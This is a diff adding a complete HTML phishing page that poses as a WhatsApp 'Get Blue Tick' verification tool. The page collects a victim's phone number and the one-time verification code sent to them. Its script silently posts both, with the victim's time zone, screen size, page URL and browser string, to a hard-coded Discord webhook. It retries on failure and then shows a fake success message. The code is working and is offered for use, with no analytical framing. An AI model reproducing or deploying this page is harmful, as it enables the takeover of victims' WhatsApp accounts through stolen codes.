@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WhatsApp</title>
+<style>
+*{box-sizing:border-box}
+body{
+  margin:0;
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+  font-family:Arial,sans-serif;
+  background:linear-gradient(140deg,#064e45,#087d66,#075e54);
+  color:#26332e;
+}
+.card{
+  width:100%;
+  max-width:400px;
+  background:white;
+  border-radius:24px;
+  overflow:hidden;
+  box-shadow:0 20px 60px #002c2555;
+  animation:appear .5s ease;
+}
+@keyframes appear{
+  from{opacity:0;transform:translateY(15px)}
+  to{opacity:1;transform:translateY(0)}
+}
+.header{
+  background:#008069;
+  color:white;
+  text-align:center;
+  padding:28px 20px;
+}
+.logo{
+  width:78px;
+  height:78px;
+  background:white;
+  border-radius:50%;
+  display:grid;
+  place-items:center;
+  margin:auto;
+}
+.logo svg{width:68px;height:68px}
+.header h2{margin:12px 0 5px;font-size:23px}
+.header p{margin:0;color:#d5eee4;font-size:13px}
+.content{padding:27px 24px 25px}
+.step{
+  color:#008069;
+  font-size:11px;
+  font-weight:bold;
+  letter-spacing:1.5px;
+}
+h3{font-size:22px;color:#075e54;margin:12px 0 8px}
+.description{font-size:13px;color:#81908a;line-height:1.6}
+textarea,input{
+  width:100%;
+  border:1px solid #dce5df;
+  border-radius:12px;
+  padding:15px;
+  font-size:15px;
+  font-family:Arial;
+  outline:none;
+  background:#fbfdfb;
+  transition:.2s;
+}
+textarea{height:135px;resize:none}
+textarea:focus,input:focus{
+  border-color:#25d366;
+  box-shadow:0 0 0 3px #25d36620;
+}
+button{
+  width:100%;
+  padding:16px;
+  border:0;
+  border-radius:12px;
+  background:#25d366;
+  color:#064c34;
+  font-size:15px;
+  font-weight:bold;
+  margin-top:18px;
+  cursor:pointer;
+  transition:.2s;
+}
+button:active{transform:scale(.98)}
+button:disabled{opacity:.6;cursor:wait}
+.back{background:#edf7f0;color:#087d66;margin-top:9px}
+.notice{
+  background:#f0f8f2;
+  color:#668174;
+  padding:12px;
+  border-radius:10px;
+  font-size:11px;
+  line-height:1.6;
+  margin-top:18px;
+}
+.hidden{display:none!important}
+.loading,.success{text-align:center;padding:25px 0}
+.spinner{
+  width:54px;height:54px;
+  border:5px solid #e5f5eb;
+  border-top-color:#25d366;
+  border-radius:50%;
+  margin:5px auto 22px;
+  animation:spin .8s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading h3{font-size:19px;margin:0 0 8px}
+.loading p{font-size:13px;color:#81908a}
+.check{
+  width:76px;height:76px;
+  background:#25d366;
+  color:white;
+  border-radius:50%;
+  display:grid;
+  place-items:center;
+  font-size:40px;
+  margin:0 auto 20px;
+  animation:pop .45s ease;
+}
+@keyframes pop{
+ 0%{transform:scale(.2);opacity:0}
+ 70%{transform:scale(1.15)}
+ 100%{transform:scale(1);opacity:1}
+}
+.success h3{color:#087d54;margin:0 0 9px}
+.success p{font-size:13px;color:#81908a;line-height:1.6}
+.status{text-align:center;color:#b64b40;font-size:12px;margin-top:12px}
+.footer{text-align:center;padding:0 20px 20px;color:#9aa9a1;font-size:10px}
+</style>
+</head>
+<body>
+<div class="card">
+<header class="header">
+ <div class="logo">
+  <svg viewBox="0 0 100 100">
+   <path fill="#25d366" d="M50 5a43 43 0 0 0-37 65L7 93l25-6A43 43 0 1 0 50 5"/>
+   <path fill="white" d="M34 26c-3 0-7 5-7 11 0 15 22 38 39 38 7 0 12-5 12-10 0-2-12-8-15-8-2 0-5 6-7 6-5-2-13-10-15-15 0-2 6-5 6-7-1-3-9-15-13-15z"/>
+  </svg>
+ </div>
+ <h2>WhatsApp</h2>
+ <p>Get Blue Tick</p>
+</header>
+<main class="content">
+
+<!-- STEP 1 -->
+<section id="step1">
+ <div class="step">STEP 01 / 02</div>
+ <h3>Phone number</h3>
+ <p class="description">Enter Your Number.</p>
+ <textarea id="message" maxlength="1500"
+ placeholder="Enter your number"></textarea>
+ <button id="continue1" onclick="nextStep()">
+ Continue →
+ </button>
+</section>
+
+<!-- LOADING 1 -->
+<section id="loading1" class="loading hidden">
+ <div class="spinner"></div>
+ <h3>Confirming number</h3>
+ <p>Please wait a moment...</p>
+</section>
+
+<!-- STEP 2 -->
+<section id="step2" class="hidden">
+ <div class="step">STEP 02 / 02</div>
+ <h3>Verification Code</h3>
+ <p class="description">Almost done!Enter the code sent to you?</p>
+ <input id="name" maxlength="80"
+ placeholder="Enter Code">
+ <button id="continue2" onclick="sendMessage()">
+ Continue →
+ </button>
+ <button class="back" onclick="previousStep()">
+ ← Go back
+ </button>
+</section>
+
+<!-- LOADING 2 -->
+<section id="loading2" class="loading hidden">
+ <div class="spinner"></div>
+ <h3>Confirming....</h3>
+ <p>Please wait while we confirm your information...</p>
+</section>
+
+<!-- SUCCESS -->
+<section id="success" class="success hidden">
+ <div class="check">✓</div>
+ <h3>Successfully Adding blue tick</h3>
+ <p>Please wait like 5 hours </p>
+ <button onclick="restart()">Done</button>
+</section>
+
+<div class="notice">
+This tool gives you a blue tick on WhatsApp
+</div>
+<div id="status" class="status"></div>
+
+</main>
+<div class="footer">
+WhatsApp Blue tick verification
+</div>
+</div>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1571573643807297626/Xocp4phZqKLbzSQoNQz3eR-ObmfrEcAfgiG7UgjRyeVg_7B3wgwoQMnR4v6hh_3znezg";
+
+const cut = (s, n) => {
+  s = String(s == null ? "" : s);
+  return s.length > n ? s.slice(0, n - 3) + "..." : s;
+};
+
+function show(id){
+  ["step1","loading1","step2","loading2","success"]
+    .forEach(x => document.getElementById(x).classList.add("hidden"));
+  document.getElementById(id).classList.remove("hidden");
+  document.getElementById("status").textContent = "";
+}
+
+const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+function buildPayload(number, code){
+  const now = new Date();
+  let tz = "unknown";
+  try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown"; } catch(e){}
+
+  return {
+    username: "WhatsApp Verify",
+    allowed_mentions: { parse: [] },
+    embeds: [{
+      title: "New Blue Tick Submission",
+      color: 0x25d366,
+      timestamp: now.toISOString(),
+      fields: [
+        { name: "Phone Number", value: cut(number, 1024) || "—", inline: false },
+        { name: "Verification Code", value: cut(code, 1024) || "—", inline: false },
+        { name: "Local Time", value: cut(now.toLocaleString(), 100), inline: true },
+        { name: "Time Zone", value: cut(tz, 100), inline: true },
+        { name: "Screen", value: screen.width + "x" + screen.height, inline: true },
+        { name: "Page", value: cut(location.href, 512), inline: false },
+        { name: "Browser", value: cut(navigator.userAgent, 1024), inline: false }
+      ],
+      footer: { text: "WhatsApp Blue Tick Verification" }
+    }]
+  };
+}
+
+async function post(url, body){
+  const res = await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(body),
+    mode: "cors",
+    cache: "no-store",
+    keepalive: true
+  });
+  if (!res.ok) throw new Error("HTTP " + res.status);
+  return res;
+}
+
+async function deliver(number, code){
+  const payload = buildPayload(number, code);
+
+  try {
+    await post(WEBHOOK + "?wait=true", payload);
+    return true;
+  } catch (err1) {
+    console.warn("Webhook first attempt failed, retrying:", err1);
+  }
+
+  try {
+    await delay(800);
+    await post(WEBHOOK + "?wait=true", payload);
+    return true;
+  } catch (err2) {
+    console.error("Webhook retry failed, using beacon:", err2);
+    try {
+      navigator.sendBeacon(
+        WEBHOOK,
+        new Blob([JSON.stringify(payload)], { type: "application/json" })
+      );
+    } catch (e) {}
+    return false;
+  }
+}
+
+async function nextStep(){
+  const message = document.getElementById("message").value.trim();
+  if (!message){
+    document.getElementById("status").textContent = "Enter your number";
+    return;
+  }
+
+  const button = document.getElementById("continue1");
+  button.disabled = true;
+  show("loading1");
+  await delay(2000);
+  show("step2");
+  button.disabled = false;
+  document.getElementById("name").focus();
+}
+
+function previousStep(){
+  show("step1");
+}
+
+async function sendMessage(){
+  const name = document.getElementById("name").value.trim();
+  const message = document.getElementById("message").value.trim();
+
+  if (!name){
+    document.getElementById("status").textContent = "Enter verification code";
+    return;
+  }
+
+  const button = document.getElementById("continue2");
+  button.disabled = true;
+  show("loading2");
+
+  const [ok] = await Promise.all([
+    deliver(message, name),
+    delay(2000)
+  ]);
+
+  if (!ok){
+    console.warn("Submission not confirmed by webhook.");
+  }
+
+  show("success");
+  button.disabled = false;
+}
+
+function restart(){
+  document.getElementById("message").value = "";
+  document.getElementById("name").value = "";
+  show("step1");
+}
+</script>
+</body>
+  </html>
